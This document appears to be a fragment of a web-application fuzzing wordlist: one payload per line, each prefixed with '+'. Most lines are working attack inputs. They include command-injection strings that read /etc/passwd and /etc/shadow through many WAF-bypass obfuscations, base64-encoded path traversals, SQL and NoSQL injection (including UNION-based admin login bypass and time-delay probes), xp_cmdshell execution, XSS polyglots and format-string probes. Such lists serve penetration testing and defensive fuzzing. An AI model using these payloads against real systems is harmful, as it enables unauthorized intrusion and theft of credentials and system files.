+ca${jjj}t${IFS}${APACHE_RUN_DIR%???????????????}et${jjj}c${APACHE_RUN_DIR%???????????????}pas${jjj}swd
+ca$@t /etc/passwd
+cat /etc/hosts
+cat /etc/passwd
+cat /etc$u/passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat%20%2Fetc%24u%2Fpasswd
+cat%24%7BIFS%7D%2Fetc%2Fpasswd
+cat%24IFS%2Fetc%2Fpasswd
+cat%24u%20%2Fetc%24u%2Fpasswd%24u
+cat%24u%2B%2Fetc%24u%2Fpasswd%24u
+cat${IFS}/etc/passwd
+cat${IFS}${PATH%%u*}etc${PATH%%u*}passwd
+cat$IFS/etc/passwd
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+cat$u /etc$u/passwd$u
+cat$u+/etc$u/passwd$u
+char%4039%41%2b%40SELECT
+config.asp
+config.inc.php
+config.js
+config.php
+count(/child::node())
+d:\AppServ\MySQL
+d:\System32\Inetsrv\metabase.xml
+data.php
+database.asp
+database.js
+database.php
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+db.php
+dbase.php a
+dbg=1
+dbg=true
+dbg=y
+dbg=yes
+debug=1
+debug=true
+debug=y
+debug=yes
+delete
+desc
+distinct
+edit=1
+edit=true
+edit=y
+edit=yes
+etc/passwd
+etc/shadow%00
+example.com
+exec sp
+exec xp
+FALSE
+ffifdyop
+file.js/1.jpg
+file.js%0a%0d.jpg
+grant=1
+grant=true
+grant=y
+grant=yes
+handler
+having
+hi' or 'a'='a
+hi’ or ‘a’='a
+hi' or 1=1 --
+hi’ or 1=1 –
+hi') or ('a'='a
+hi’) or (‘a’='a
+hi" or "a"="a
+hi” or “a”=”a
+hi" or 1=1 --
+hi” or 1=1 –
+hi”) or (“a”=”)
+hi") or ("a"="a
+http://<yourservername>/
+http://example.com
+i%24%28u%29d
+i%60u%60d
+i`u`d
+i$(u)d
+id
+id&&whoami;
+id&whoami;
+id%00
+id%00|
+id%26%26whoami%3B
+id%26whoami%3B
+id%7C%7Cwhoami%3B
+id%7Cwhoami%3B
+id||whoami;
+id|whoami;
+IFS=,;`cat<<<cat,/etc/passwd`
+IFS=];b=cat]/etc/passwd;$b
+insert
+install.php
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+L21hc3Rlci5wYXNzd2Q=
+L2V0Yy9tYXN0ZXIucGFzc3dk
+L2V0Yy9wYXNzd2Q=
+L2V0Yy9wYXNzd2QlMDA=
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vZXRjL3Bhc3N3ZA==
+Li4vZXRjL3Bhc3N3ZCUwMA==
+like
+like '%'
+limit
+member/.htpasswd
+members/.htpasswd
+null
+NULL
+or
+or 0=0 --
+or 0=0 –
+or 0=0 #
+or 1=1
+OR 1=1
+or 1=1--
+or 1=1–
+or 1=1/*
+or 1=1#
+or true
+or true--
+or%201=1
+or%201=1 --
+order by
+pass.dat
+Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
+Pass1234." and 1=0 union select "admin",sha("Pass1234.
+Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
+passwd
+passwd.dat
+php -r 'var_dump(exec("id"));'
+php%20-r%20%27var_dump%28exec%28%22id%22%29%29%3B%27
+poc.'xor sleep(3) or'.jpg
+poc./*'xor sleep(3) or'*/.jpg
+poc.js.'-sleep(3)-'.jpg
+poc.js.'+(select*from(select(sleep(3)))aaa)+'.jpg
+poc.js.'+sleep(3)+'.jpg
+poc.js.'xor 1 or'.jpg
+poc.js.'xor sleep(3) or'.jpg
+PRINT
+PRINT @@variable
+procedure
+pwd
+pwd)
+pwd))
+RCE filter and WAF Bypass:
+replace
+response.write 111111
+root/.htpasswd
+select
+something%00html
+system('cat /etc/passwd');
+system('ls')
+system%28%27cat%20%2Fetc%2Fpasswd%27%29%3B
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+tail${IFS}${APACHE_CONFDIR%${APACHE_CONFDIR#?}}et?${APACHE_CONFDIR%${APACHE_CONFDIR#?}}pas?wd
+test=1
+test=true
+test=y
+test=yes
+to_timestamp_tz
+true
+TRUE
+true, $where: '1 == 1'
+truncate
+tz_offset
+uname${IFS}-a
+update
+user/.htpasswd
+users.db.php
+users/.htpasswd
+w%24%7Bu%7Dh%24%7Bu%7Do%24%7Bu%7Da%24%7Bu%7Dm%24%7Bu%7Di
+w${u}h${u}o${u}a${u}m${u}i
+waitfor delay '00:02'
+waitfor delay '00:02' -- 
+waitfor delay \'00:02\'
+waitfor delay \'00:02\' -- 
+web.config
+whoami
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+x&&ping+-c+10+127.0.0.1||
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+x||ping+-c+10+127.0.0.1||
+xsstest
+xsstest%00"<>'
+XXXXX.%p
+XXXXX`perl -e 'print ".%p" x 80'`
+ZXRjL3Bhc3N3ZA==
+ZXRjL3NoYWRvdyUwMA==
